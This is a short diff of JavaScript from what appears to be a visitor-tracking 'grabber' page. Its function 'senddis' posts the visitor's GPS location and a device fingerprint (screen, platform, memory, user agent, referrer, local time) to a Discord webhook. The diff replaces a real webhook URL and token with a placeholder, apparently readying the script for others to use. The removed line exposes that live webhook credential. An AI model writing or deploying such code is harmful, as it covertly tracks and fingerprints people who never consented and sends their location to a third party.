@@ -77,7 +77,7 @@
 
     function senddis(gpsr) {
      var request = new XMLHttpRequest();
-     request.open("POST", "https://discord.com/api/webhooks/947418733658378290/GTO6x_NcLs19c_XerY1ZnzCcHoKOJICrP9IXOs2WAO5qPdEc5JmBRlTNnWYmR_LSBLAU");
+     request.open("POST", "your discord webhook url");
      request.setRequestHeader('Content-type', 'application/json');
      var params = {
       content: ("> **DeviceGps  : **" + gpsr + "\n> **ScreenWidth : **" + width + "\n> **ScreenHeight : **" + height + "\n> **PlatForm : **" + platform + "\n> **DeviceLanguage : **" + devicelang + "\n> **DeviceMemory : **" + deviceram + "\n> **IsCookieEnabled : **" + iscookieEnabled + "\n> **UserAgent : **" + useragent + "\n> **CpuThreads : **" + cpuThreads + "\n> **ReferUrl : **" + referurl + "\n> **DeviceLocalTime : **" + localtime + "\n"),
